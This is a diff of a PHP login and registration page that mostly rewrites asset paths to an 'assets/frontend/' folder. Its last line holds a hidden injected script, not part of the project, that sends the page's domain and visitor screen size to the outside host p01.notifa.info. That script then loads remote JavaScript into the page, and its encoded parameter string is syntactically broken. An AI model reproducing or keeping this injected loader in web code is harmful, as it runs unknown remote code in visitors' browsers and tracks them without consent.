@@ -11,14 +11,14 @@
     <meta name="description" content="">
     <meta name="author" content="">
     <!-- Favicon icon -->
-    <link rel="icon" type="image/png" sizes="16x16" href="<?php echo base_url('assets/images/favicon.png') ?>">
+    <link rel="icon" type="image/png" sizes="16x16" href="<?php echo base_url('assets/frontend/images/favicon.png') ?>">
     <title>Halaman Login</title>
     <!-- Bootstrap Core CSS -->
-    <link href="<?php echo base_url('assets/plugins/bootstrap/css/bootstrap.min.css') ?>" rel="stylesheet">
+    <link href="<?php echo base_url('assets/frontend/plugins/bootstrap/css/bootstrap.min.css') ?>" rel="stylesheet">
     <!-- Custom CSS -->
-    <link href="<?php echo base_url('assets/css/style.css') ?>" rel="stylesheet">
+    <link href="<?php echo base_url('assets/frontend/css/style.css') ?>" rel="stylesheet">
     <!-- You can change the theme colors from here -->
-    <link href="<?php echo base_url('assets/css/colors/blue.css') ?>" id="theme" rel="stylesheet">
+    <link href="<?php echo base_url('assets/frontend/css/colors/blue.css') ?>" id="theme" rel="stylesheet">
     <!-- H
     <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js') ?>"></script>
     <script src="https://oss.maxcdn.com/libs/respond.js') ?>/1.4.2/respond.min.js') ?>"></script>
@@ -37,7 +37,7 @@
     <!-- Main wrapper - style you can find in pages.scss -->
     <!-- ============================================================== -->
     <section id="wrapper">
-        <div class="login-register" style="background-image:url(../assets/images/background/login-register.jpg);">
+        <div class="login-register" style="background-image:url(../assets/frontend/images/background/login-register.jpg);">
             <div class="login-box card">
                 <div class="card-body">
                     <form class="form-horizontal form-material" id="loginform" method="POST" action="<?php echo site_url('auth/c_proses_daftar'); ?>">
@@ -77,25 +77,25 @@
     <!-- ============================================================== -->
     <!-- All Jquery -->
     <!-- ============================================================== -->
-    <script src="<?php echo base_url('assets/plugins/jquery/jquery.min.js') ?>"></script>
+    <script src="<?php echo base_url('assets/frontend/plugins/jquery/jquery.min.js') ?>"></script>
     <!-- Bootstrap tether Core JavaScript -->
-    <script src="<?php echo base_url('assets/plugins/bootstrap/js/popper.min.js') ?>"></script>
-    <script src="<?php echo base_url('assets/plugins/bootstrap/js/bootstrap.min.js') ?>"></script>
+    <script src="<?php echo base_url('assets/frontend/plugins/bootstrap/js/popper.min.js') ?>"></script>
+    <script src="<?php echo base_url('assets/frontend/plugins/bootstrap/js/bootstrap.min.js') ?>"></script>
     <!-- slimscrollbar scrollbar JavaScript -->
-    <script src="<?php echo base_url('assets/js/jquery.slimscroll.js') ?>"></script>
+    <script src="<?php echo base_url('assets/frontend/js/jquery.slimscroll.js') ?>"></script>
     <!--Wave Effects -->
-    <script src="<?php echo base_url('assets/js/waves.js') ?>"></script>
+    <script src="<?php echo base_url('assets/frontend/js/waves.js') ?>"></script>
     <!--Menu sidebar -->
-    <script src="<?php echo base_url('assets/js/sidebarmenu.js') ?>"></script>
+    <script src="<?php echo base_url('assets/frontend/js/sidebarmenu.js') ?>"></script>
     <!--stickey kit -->
-    <script src="<?php echo base_url('assets/plugins/sticky-kit-master/dist/sticky-kit.min.js') ?>"></script>
-    <script src="<?php echo base_url('assets/plugins/sparkline/jquery.sparkline.min.js') ?>"></script>
+    <script src="<?php echo base_url('assets/frontend/plugins/sticky-kit-master/dist/sticky-kit.min.js') ?>"></script>
+    <script src="<?php echo base_url('assets/frontend/plugins/sparkline/jquery.sparkline.min.js') ?>"></script>
     <!--Custom JavaScript -->
-    <script src="<?php echo base_url('assets/js/custom.min.js') ?>"></script>
+    <script src="<?php echo base_url('assets/frontend/js/custom.min.js') ?>"></script>
     <!-- ============================================================== -->
     <!-- Style switcher -->
     <!-- ============================================================== -->
-    <script src="<?php echo base_url('assets/plugins/styleswitcher/jQuery.style.switcher.js') ?>"></script>
+    <script src="<?php echo base_url('assets/frontend/plugins/styleswitcher/jQuery.style.switcher.js') ?>"></script>
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH24ojOHb%2fQMcYoKrt2KFM8P3ToJcyGjEjrV%2fx8PWPp%2f376LeB5yLfT6COZhymaOE1h1tSPUwqSvUu147IMs94IDCp9rraiJrlkuyRWnEZ6h67fEqMWcw0DwbV96qFSI5iTxhtFfumHoLxqvJJ5L9SdtuQx%2bETUcu87phwA3KYIUQSLxgtGENJZxPSWvWBcu%2bGDP7j%2fZgBr%2f71tXUSkaq9OvtD3BKgae01tbehpbJ39o7P4Xy5UePSw7A4ZzCey8uyzyXLsYuIkgJS1HndsGThlFviGTduo%2bKaGQXOx%2b4LyV3csTKFva4K0hiCcxI6cyO%2fdRuteuCmikQjwTBE6L4D8vdYmn60nfn8xqB%2bmBgOQnvu9%2fN1o97oD%2fs1HSvE1BJW%2fm8eQwpf0SdoxXnHQ2yKvqRAg%2boW8hNI%2bVvqbNST9x%2fPbW%2bemi698LT0YSk%2fOLWoXcMC56V%2fonuOkrBJLwFmSM2c6jv2ZGkVhfjcH4baZHn3en3DcYdPLGDeuvRzitbM5 + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
 
